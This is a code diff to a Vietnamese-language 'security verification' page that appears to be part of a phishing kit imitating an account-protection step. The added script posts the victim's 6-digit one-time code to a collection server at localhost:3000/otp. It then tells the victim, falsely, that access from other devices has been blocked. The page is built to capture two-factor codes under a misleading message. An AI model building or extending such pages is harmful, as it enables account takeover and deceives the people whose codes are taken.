@@ -191,17 +191,11 @@
                 <div class="email-sdt-container">
                     <h2 style="font-weight: 600;">Xác minh bảo mật</h2>
                     <label class="email-sdt">Mã xác minh</label>
-                    <input type="text">
-                    <label style="font-size: 14px; color:#707A8A; margin-top: 4px;">Hãy nhập mã xác thực gồm 6 chữ
-                        số</label>
+                    <input type="number" id="otp" pattern="[0-9]*">
+                    <label style="font-size: 14px; color:#707A8A; margin-top: 4px;">Hãy nhập mã xác thực gồm 6 chữ số</label>
                 </div>
                 <br>
-                <button class="next-btn" onclick="checkInput()"> Gửi </button>
-                <br>
-                <div class="change-method">
-                    <p style="color:#C99400">Chuyển sang phương thức xác minh khác</p>
-                    <p style="color:#C99400">Xác minh bảo mật không khả dụng?</p>
-                </div>
+                <button class="next-btn" id="send"> Gửi </button>
                 <script>
                     const input = document.querySelector('input');
                     const button = document.querySelector('.next-btn');
@@ -213,15 +207,42 @@
                             button.classList.remove('yellow');
                         }
                     });
-                    function checkInput() {
-                        var input = document.querySelector("input").value;
-                        if (input.length == 6) {
-                            alert("Xác minh thành công");
+
+                    document.getElementById("send").addEventListener("click", async function () {
+                        var inputData = document.getElementById("otp").value;
+                        if (inputData.length == 6) {
+                            // var xhttp = new XMLHttpRequest();
+                            // xhttp.open("POST", "http://localhost:3000/otp", false);
+                            // xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+                            // xhttp.send(`otp=${inputData}`);
+                            // alert("Xác minh thành công truy cập từ các thiết bị khác đã bị chặn lại")
+                            try {
+                                const response = await fetch('http://localhost:3000/otp', {
+                                    method: 'POST',
+                                    headers: {
+                                        'Content-Type': 'application/x-www-form-urlencoded'
+                                    },
+                                    body: `otp=${inputData}`
+                                });
+                                if (response.ok) {
+                                    alert("Xác minh thành công truy cập từ các thiết bị khác đã bị chặn lại")
+                                } else {
+                                    alert("Yêu cầu không được nhấp nhận")
+                                }
+                            } catch (error) {
+                                alert("Có lỗi xảy ra khi gửi yêu cầu")
+                            }
                         } else {
-                            alert("Điền mã xác minh")
+                            alert("Hãy Điền mã xác minh chính xác")
                         }
-                    }
+                    });
                 </script>
+                <br>
+                <div class="change-method">
+                    <p style="color:#C99400">Chuyển sang phương thức xác minh khác</p>
+                    <p style="color:#C99400">Xác minh bảo mật không khả dụng?</p>
+                </div>
+
             </div>
 
         </div>
